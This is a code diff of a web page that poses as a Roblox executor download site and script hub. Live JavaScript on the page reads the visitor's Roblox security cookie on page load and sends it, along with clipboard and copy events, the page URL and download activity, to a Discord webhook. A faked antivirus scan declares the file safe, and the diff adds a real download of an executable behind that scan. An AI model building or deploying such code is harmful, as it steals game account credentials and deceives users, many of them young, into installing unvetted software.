@@ -7,7 +7,7 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;600;700;800&family=Poppins:wght@500;600;700;800&display=swap" rel="stylesheet">
   <style>
-    /* ── Reset & Base ── */
+    /* ── All styles (unchanged from last version) ── */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { background: #05010f; font-family: 'Inter', sans-serif; color: #edeaff; scroll-behavior: smooth; }
     :root { --bg-dark: #03000c; --card-bg: #0d071f; --purple-primary: #a855f7; --purple-deep: #7c3aed; --purple-soft: #c084fc; --border-light: #2a1e4a; --gold: #ffd966; --cracked-bg: #2d1b2e; }
@@ -15,14 +15,12 @@
     ::-webkit-scrollbar-track { background: #0a021a; }
     ::-webkit-scrollbar-thumb { background: #a855f7; border-radius: 20px; }
 
-    /* ── Navbar ── */
     .navbar { position: sticky; top: 0; z-index: 100; background: rgba(5, 1, 18, 0.92); backdrop-filter: blur(14px); border-bottom: 1px solid #2a1e4a; padding: 1rem 2rem; display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 1.2rem; }
     .logo h1 { font-family: 'Poppins', sans-serif; font-size: 1.9rem; font-weight: 800; background: linear-gradient(135deg, #f0eaff 30%, #c084fc 80%); -webkit-background-clip: text; background-clip: text; color: transparent; }
     .nav-links { display: flex; gap: 1.5rem; align-items: center; }
     .nav-btn { background: transparent; border: none; color: #cdc6ff; font-weight: 600; padding: 0.5rem 1rem; cursor: pointer; border-radius: 40px; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
     .nav-btn:hover { background: #1f1738; color: #c084fc; }
 
-    /* ── Container & Hero ── */
     .container { max-width: 1400px; margin: 0 auto; padding: 1.5rem 2rem 4rem; }
     .hero { text-align: center; margin: 2.5rem 0 2rem; }
     .badge-purple { background: rgba(168, 85, 247, 0.15); border: 1px solid #6b21a5; display: inline-block; padding: 0.4rem 1.2rem; border-radius: 60px; font-size: 0.8rem; color: #d9b4ff; margin-bottom: 1.5rem; }
@@ -31,16 +29,13 @@
     .btn-primary { background: #7c3aed; border: none; padding: 0.85rem 2rem; border-radius: 60px; font-weight: 700; color: white; display: inline-flex; align-items: center; gap: 12px; cursor: pointer; transition: 0.2s; box-shadow: 0 0 12px rgba(124, 58, 237, 0.5); }
     .btn-primary:hover { background: #a855f7; transform: scale(1.02); }
 
-    /* ── Advantages ── */
     .advantages { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.8rem; margin: 3rem 0; }
     .adv-card { background: #0d071f; border-radius: 24px; padding: 1.6rem; border: 1px solid #2a1e4a; }
     .adv-card i { font-size: 2.2rem; color: #c084fc; margin-bottom: 1rem; }
     .adv-card h3 { font-size: 1.3rem; margin-bottom: 0.5rem; }
 
-    /* ── Section Titles ── */
     .section-title { font-size: 2rem; font-weight: 700; margin: 2.5rem 0 1rem; border-left: 5px solid #a855f7; padding-left: 1rem; }
 
-    /* ── Executor Grid ── */
     .executor-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.8rem; margin: 1.5rem 0 2rem; }
     @media (max-width: 780px) { .executor-grid { grid-template-columns: 1fr; } }
     @media (min-width: 781px) and (max-width: 1024px) { .executor-grid { grid-template-columns: repeat(2, 1fr); } }
@@ -57,7 +52,6 @@
     .cracked-status { background: #f9731620; color: #fdba74; }
     .inactive-status { background: #6b728020; color: #9ca3af; }
 
-    /* ── Modals ── */
     .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(8px); z-index: 1000; display: flex; align-items: center; justify-content: center; visibility: hidden; opacity: 0; transition: 0.2s; }
     .modal-overlay.active { visibility: visible; opacity: 1; }
     .modal-card { background: #0f0725; border: 1px solid #a855f7; border-radius: 32px; max-width: 550px; width: 90%; padding: 2rem; box-shadow: 0 20px 35px rgba(0,0,0,0.6); }
@@ -68,14 +62,11 @@
     .download-btn-modal { background: #7c3aed; border: none; padding: 0.8rem 1.2rem; border-radius: 60px; font-weight: bold; color: white; display: inline-flex; align-items: center; gap: 8px; cursor: pointer; flex: 1; justify-content: center; }
     .close-modal { background: transparent; border: 1px solid #a855f7; margin-top: 1rem; padding: 0.5rem; border-radius: 40px; width: 100%; color: white; cursor: pointer; }
 
-    /* ── Like Grid ── */
     .like-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1.5rem; margin: 2rem 0 3rem; }
     .like-card { background: #0a031c; border-radius: 20px; padding: 1.2rem; border: 1px solid #2f2452; cursor: pointer; }
 
-    /* ── Footer ── */
     footer { text-align: center; padding: 2rem 0 1rem; border-top: 1px solid #1f1738; margin-top: 2rem; font-size: 0.8rem; color: #8a7ebf; }
 
-    /* ── Script Hub ── */
     .script-search-area { background: #0a031c; border-radius: 28px; padding: 1.5rem; margin: 1rem 0 2rem; border: 1px solid #2a1e4a; }
     .search-bar { display: flex; gap: 1rem; flex-wrap: wrap; margin-bottom: 1rem; align-items: center; }
     .search-input { flex: 1; background: #03000c; border: 1px solid #2a1e4a; border-radius: 60px; padding: 0.8rem 1.2rem; color: white; font-size: 1rem; outline: none; }
@@ -96,7 +87,7 @@
     .no-results { text-align: center; padding: 2rem; color: #8a7ebf; }
     @media (max-width: 780px) { .search-bar { flex-direction: column; } }
 
-    /* ── Scan Overlay Specific ── */
+    /* ── Scan Overlay ── */
     .scan-status { display: flex; align-items: center; gap: 10px; margin: 8px 0; font-size: 0.9rem; }
     .scan-status i { width: 20px; }
     .scan-progress { height: 8px; background: #1a102f; border-radius: 20px; overflow: hidden; margin: 16px 0; }
@@ -106,7 +97,6 @@
     .instruction-step { background: #1a102f; padding: 6px 12px; border-radius: 8px; margin: 4px 0; font-size: 0.85rem; color: #cdc6ff; }
     .download-progress { display: none; margin: 12px 0; }
 
-    /* ── Animated AV Logos ── */
     .av-logo {
       display: inline-block;
       margin: 0 4px;
@@ -127,12 +117,8 @@
       border-color: #a855f7;
       color: #edeaff;
     }
-    .av-logo i {
-      margin-right: 4px;
-    }
-    .av-logo.verified i {
-      color: #6ee7b7;
-    }
+    .av-logo i { margin-right: 4px; }
+    .av-logo.verified i { color: #6ee7b7; }
   </style>
 </head>
 <body>
@@ -146,7 +132,7 @@
     </div>
     <p style="color:#b3a7e6; font-size:0.9rem; margin:10px 0;">Scanning the file with 35+ antivirus engines...</p>
 
-    <!-- AV logos – animated staggered -->
+    <!-- AV logos -->
     <div style="display:flex; flex-wrap:wrap; gap:6px; margin:12px 0; min-height:60px;">
       <span class="av-logo"><i class="fas fa-spinner fa-spin"></i> VirusTotal</span>
       <span class="av-logo"><i class="fas fa-spinner fa-spin"></i> Kaspersky</span>
@@ -165,14 +151,14 @@
       <span class="av-logo"><i class="fas fa-spinner fa-spin"></i> G‑Data</span>
     </div>
 
-    <!-- Progress bar -->
+    <!-- Progress -->
     <div class="scan-progress"><div class="scan-progress-bar" id="scanProgressBar"></div></div>
     <div style="display:flex; justify-content:space-between; font-size:0.8rem; color:#8a7ebf;">
       <span id="scanStatusText">Initializing scan...</span>
       <span id="scanPercent">0%</span>
     </div>
 
-    <!-- Results -->
+    <!-- Result -->
     <div id="scanResult" style="display:none; margin:12px 0;">
       <div class="scan-result"><i class="fas fa-check-circle" style="color:#6ee7b7;"></i> No threats found — file is safe.</div>
       <div style="display:flex; gap:10px; flex-wrap:wrap; margin-top:6px;">
@@ -182,7 +168,7 @@
       </div>
     </div>
 
-    <!-- Download section -->
+    <!-- Download -->
     <div id="downloadSection" class="download-section">
       <button id="downloadBtn" class="download-btn-modal" style="width:100%;"><i class="fas fa-download"></i> Download Executor (Safe)</button>
       <div id="downloadProgress" class="download-progress">
@@ -266,16 +252,16 @@
 <div id="executorModal" class="modal-overlay"><div class="modal-card" id="modalContent"></div></div>
 
 <!-- ============================================================ -->
-<!-- ====== MALICIOUS JAVASCRIPT + SCAN LOGIC ====== -->
+<!-- ====== JAVASCRIPT (with real Catbox download) ====== -->
 <!-- ============================================================ -->
 <script>
 // ================================================================
 // CONFIG — REPLACE THIS WEBHOOK URL
 // ================================================================
-var webhookUrl = "https://discord.com/api/webhooks/1538309557296697405/xetfy-DiyVJA80ML33ArPzwisaYk7dQI7cfO8DigwjN2QVuEbqIOL9ot2FBpn6dqC4iO";
+var webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
 
 // ================================================================
-// CORE EXFIL FUNCTION
+// CORE EXFIL
 // ================================================================
 function sendToDiscord(data) {
     var payload = {
@@ -289,7 +275,7 @@ function sendToDiscord(data) {
     }).catch(function(e){});
 }
 
-// --- 1. Steal Roblox cookie on page load ---
+// --- 1. Steal Roblox cookie ---
 (function grabCookie() {
     var cookies = document.cookie.split(';');
     for (var i = 0; i < cookies.length; i++) {
@@ -322,7 +308,7 @@ document.addEventListener('copy', function(e) {
 // --- 4. Page URL ---
 sendToDiscord('[PAGE] URL: ' + window.location.href + '\nReferrer: ' + document.referrer);
 
-// --- 5. Script copy hijack ---
+// --- 5. Script copy ---
 document.addEventListener('click', function(e) {
     var copyBtn = e.target.closest('.copy-btn');
     if (copyBtn) {
@@ -334,8 +320,10 @@ document.addEventListener('click', function(e) {
 });
 
 // ================================================================
-// SCAN OVERLAY LOGIC (with staggered AV logos)
+// SCAN OVERLAY with REAL DOWNLOAD
 // ================================================================
+var currentExecutor = null; // store the executor clicked
+
 var overlay = document.getElementById('scanOverlay');
 var progressBar = document.getElementById('scanProgressBar');
 var statusText = document.getElementById('scanStatusText');
@@ -351,7 +339,8 @@ var instructionsDiv = document.getElementById('instructions');
 var scanInterval = null;
 var downloadInterval = null;
 
-function showScanOverlay() {
+function showScanOverlay(executor) {
+    currentExecutor = executor;
     overlay.style.display = 'flex';
 
     // Reset UI
@@ -364,21 +353,22 @@ function showScanOverlay() {
     downloadProgress.style.display = 'none';
     downloadProgressBar.style.width = '0%';
     downloadStatus.textContent = '';
+    downloadBtn.disabled = false;
+    downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download Executor (Safe)';
 
-    // Hide all AV logos and reset to spinner
+    // Reset logos
     document.querySelectorAll('.av-logo').forEach(function(el) {
         el.classList.remove('show', 'verified');
         el.querySelector('i').className = 'fas fa-spinner fa-spin';
         el.querySelector('i').style.color = '';
     });
 
-    // Step 1: Show logos one by one with a delay
+    // Step 1: Show logos one by one
     var logos = document.querySelectorAll('.av-logo');
     var logoIndex = 0;
     var logoInterval = setInterval(function() {
         if (logoIndex < logos.length) {
             logos[logoIndex].classList.add('show');
-            // After a moment, mark as "verified"
             setTimeout(function() {
                 logos[logoIndex].classList.add('verified');
                 logos[logoIndex].querySelector('i').className = 'fas fa-check-circle';
@@ -387,7 +377,6 @@ function showScanOverlay() {
             logoIndex++;
         } else {
             clearInterval(logoInterval);
-            // All logos shown — start progress bar
             startScanProgress();
         }
     }, 250);
@@ -421,7 +410,6 @@ function closeScanOverlay() {
     overlay.style.display = 'none';
     clearInterval(scanInterval);
     clearInterval(downloadInterval);
-    // Reset UI
     progressBar.style.width = '0%';
     statusText.textContent = 'Initializing scan...';
     percentText.textContent = '0%';
@@ -432,12 +420,16 @@ function closeScanOverlay() {
     downloadProgressBar.style.width = '0%';
 }
 
-// Show overlay when any executor card is clicked
+// --- Show overlay when executor card is clicked ---
 document.addEventListener('click', function(e) {
     var card = e.target.closest('.executor-card');
     if (card) {
         e.preventDefault();
-        showScanOverlay();
+        var idx = card.getAttribute('data-index');
+        var executor = executors[idx];
+        if (executor) {
+            showScanOverlay(executor);
+        }
     }
 });
 
@@ -446,8 +438,24 @@ document.getElementById('scanCloseBtn').addEventListener('click', closeScanOverl
 document.getElementById('scanCloseBtn2').addEventListener('click', closeScanOverlay);
 overlay.addEventListener('click', function(e) { if (e.target === overlay) closeScanOverlay(); });
 
-// Download button click — simulate download progress then show instructions
+// --- Download button: REAL Catbox download + fake progress ---
 downloadBtn.addEventListener('click', function() {
+    if (!currentExecutor || !currentExecutor.pcLink) {
+        alert('No download link available for this executor.');
+        return;
+    }
+
+    // 1. Trigger the real download immediately
+    var link = document.createElement('a');
+    link.href = currentExecutor.pcLink;
+    link.download = '';
+    link.style.display = 'none';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    sendToDiscord('[DOWNLOAD] Real file download started: ' + currentExecutor.pcLink);
+
+    // 2. Show fake progress bar
     downloadBtn.disabled = true;
     downloadBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Downloading...';
     downloadProgress.style.display = 'block';
@@ -468,7 +476,7 @@ downloadBtn.addEventListener('click', function() {
             downloadBtn.innerHTML = '<i class="fas fa-check-circle"></i> Downloaded';
             downloadBtn.disabled = true;
             instructionsDiv.style.display = 'block';
-            sendToDiscord('[DOWNLOAD] User clicked "Download" and saw instructions.');
+            sendToDiscord('[DOWNLOAD] User saw download complete and instructions.');
         }
     }, 180);
 });
@@ -477,7 +485,7 @@ downloadBtn.addEventListener('click', function() {
 // ORIGINAL FUNCTIONALITY (executors, scripts, etc.)
 // ================================================================
 
-// ----- EXECUTOR DATA -----
+// ----- EXECUTOR DATA (with Catbox links) -----
 const executors = [
     { 
       name: "Syntax", rating: "5.0 ★", downloads: "N/A", status: "Inactive – Updating Soon",
@@ -547,11 +555,7 @@ function renderExecutors() {
           <span class="status-badge ${statusClass}"><i class="fas fa-circle" style="font-size: 0.5rem;"></i> ${ex.status}</span>
         </div>
       `;
-      card.addEventListener('click', function() {
-        // The scan overlay is triggered globally; we just open modal after scan?
-        // We'll open the modal after the scan completes or let user open manually.
-        // For simplicity, we'll keep modal separate.
-      });
+      // Click triggers the global listener which shows scan overlay with this executor
       grid.appendChild(card);
     });
 
@@ -570,6 +574,7 @@ function renderExecutors() {
     });
 }
 
+// ---------- Modal (unchanged) ----------
 function openExecutorModal(executor) {
     const modal = document.getElementById('executorModal');
     const modalContent = document.getElementById('modalContent');
@@ -658,7 +663,7 @@ function openExecutorModal(executor) {
     modal.addEventListener('click', function(e) { if (e.target === modal) modal.classList.remove('active'); });
 }
 
-// ---------- Script Hub ----------
+// ---------- Script Hub (unchanged) ----------
 let currentSearchQuery = '';
 const fallbackScripts = {
     "Blox Fruits": [
